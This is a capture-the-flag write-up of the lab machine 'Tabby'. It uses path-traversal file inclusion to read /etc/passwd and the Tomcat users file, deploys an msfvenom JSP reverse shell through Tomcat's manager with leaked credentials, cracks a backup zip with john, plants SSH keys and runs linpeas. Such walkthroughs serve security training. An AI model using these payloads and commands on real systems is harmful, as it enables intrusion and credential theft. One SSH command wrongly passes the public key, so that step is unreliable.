# Tabby

```bash
nmap -sV -sC -T5 10.129.37.41 -vv 
```

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDv5dlPNfENa5t2oe/3IuN3fRk9WZkyP83WGvRByWfBtj3aJH1wjpPJMUTuELccEyNDXaUnsbrhgH76eGVQAyF56DnY3QxWlt82MgHTJWDwdt4hKMDLNKlt+i+sElqhYwXPYYWfuApFKiAUr+KGvnk9xJrhZ9/bAp+rW84LyeJOSZ8iqPVAdcjve5As1O+qcSAUfIHlZGRzkVuUuOq2wxUvegKsYnmKWUZW1E/fRq3tJbqJ5Z0JwDklN21HR4dmM7/VTHQ/AaTl/JnQxOLFUlryXAFbjgLa1SDOTBDOG72j2/II2hdeMOKN8YZN9DHgt6qKiyn0wJvSE2nddC2BbnGzamJlnQaXOpSb3+WDHP+JMxQJQrRxFoG4R6X2c0rx+yM5XnYHur9cQXC9fp+lkxQ8TtkMijbPlS2umFYcd9WrMdtEbSeKbaozi9YwbR9MQh8zU2cBc7T9p3395HAWt/wCcK9a61XrQY/XDr5OSF2MI5ESVG9e0t8jG9Q0opFo19U=
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDeYRLCeSORNbRhDh42glSCZCYQXeOAM2EKxfk5bjXecQyV5W7DYsEqMkFgd76xwdGtQtNVcfTyXeLxyk+lp9HE=
|   256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKHA/3Dphu1SUgMA6qPzqzm6lH2Cuh0exaIRQqi4ST8y
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
|_http-title: Mega Hosting
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

After browsing the web, found that NEWS cannot be accessed, the corresponding domain is “megahosting.htb”

```bash
sudo echo "10.129.37.41 megahosting.htb" >> /etc/hosts
```

We can do LFI (Local file inclusion to enumerate the username)

```bash
http://megahosting.htb/news.php?file=../../../../etc/passwd
```

```bash
ash:/bin/bash
```

Done with port 80

# Port 8080 - Apache Tomcat

Whenever you see  Apache Tomcat  in Nmap results, your mental checklist should be:
1.	Can I access the Manager App? (Visit  [http://IP:8080/manager/html](http://ip:8080/manager/html) ).
2.	Do I have credentials? (Try defaults like  tomcat:s3cret ,  admin:admin , or look for leaked credentials in other files—like you are doing now with LFI) .
3.	Can I upload a WAR file? (If yes -> Remote Code Execution).

```bash
10.129.37.41:8080
```

![Screenshot 2026-01-10 at 7.08.23 PM.png](images/Screenshot_2026-01-10_at_7.08.23_PM.png)

Do LFI, visit “view-source:[http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml](http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml)” to get the credential

![Screenshot 2026-01-10 at 7.29.34 PM.png](images/Screenshot_2026-01-10_at_7.29.34_PM.png)

As we have manager-script role, we can use `/deploy` endpoint to upload malicious code

First, we use mfsvenom to create a reverse shell file

```bash
# Check the payload list only for java
msfvenom --list payloads | grep java

java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
java/meterpreter/bind_tcp                                          Run a meterpreter server in Java. Listen for a connection
java/meterpreter/reverse_http                                      Run a meterpreter server in Java. Tunnel communication over HTTP
java/meterpreter/reverse_https                                     Run a meterpreter server in Java. Tunnel communication over HTTPS
java/meterpreter/reverse_tcp                                       Run a meterpreter server in Java. Connect back stager
java/shell/bind_tcp                                                Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
java/shell/reverse_tcp                                             Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
java/shell_reverse_tcp                                             Connect back to attacker and spawn a command shell

```

We choose `java/jsp_shell_reverse_tcp` to build a reverse shell

```bash
# Create the payload file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.151 LPORT=4444 -f war > shell.war
```

```bash
# Upload the payload to tomcat9
curl -u 'tomcat:$3cureP4s5w0rd123!' -T shell.war  http://megahosting.htb:8080/manager/text/deploy?path=/app4
```

Then use `nc -nvlp 4444` to create port listener in the attacker machine

Visit [`http://megahosting.htb:8080/app4/rodnywejmsicp.jsp`](http://megahosting.htb:8080/app4/rodnywejmsicp.jsp) to connect to our attacker machine

# tomcat9@tabby

```bash
# To find every zip file
find . -type f -name "*.zip" 2>/dev/null

...
16162020_backup.zip
...
```

We got `16162020_backup.zip` , then we can use zip2john and john to crack the unzip password

```bash
# Use zip2john and john to crack the unzip password
zip2john 16162020_backup.zip 2>/dev/null > hash
```

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
password: admin@it
```

We used the password to unzip the file but found nothing interesting, then we tried to login ash account with `admin@it` , and it worked!

# Post exploitation

We want to ssh in ash’s account for a better prompt

```bash
# Use ssh-keygen to generate ssh key pairs in attacker machine
ssh-keygen mykey

# Copy the content in mykey.pub
```

```bash
# Create .ssh directory in victim machine
mkdir .ssh

# Paste the public key in authorized_keys
echo "[content of mykey.pub]" > authorized_keys
```

```bash
# ssh into ash's account
ssh -i mykey.pub ash@machine_ip
```

# **Privilege escalation**

Use linpeas to find privesc vulnerabilities in ash 

```bash
# Download linpeas in ash's machine
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Turn it into executable
chmod +x linpeas.sh

# Run it
./linpeas.sh
```

We spot that the user group is in lxd, which is related to privesc

Searched `lxd privesc hacktricks` in google to get the steps to hack it

… 

…

After getting the root shell, we search for the flag

```bash
# Use find to search for .txt file
find -name "*.txt"

./mnt/root/root/root.txt
```

Finished the lab!!!!!
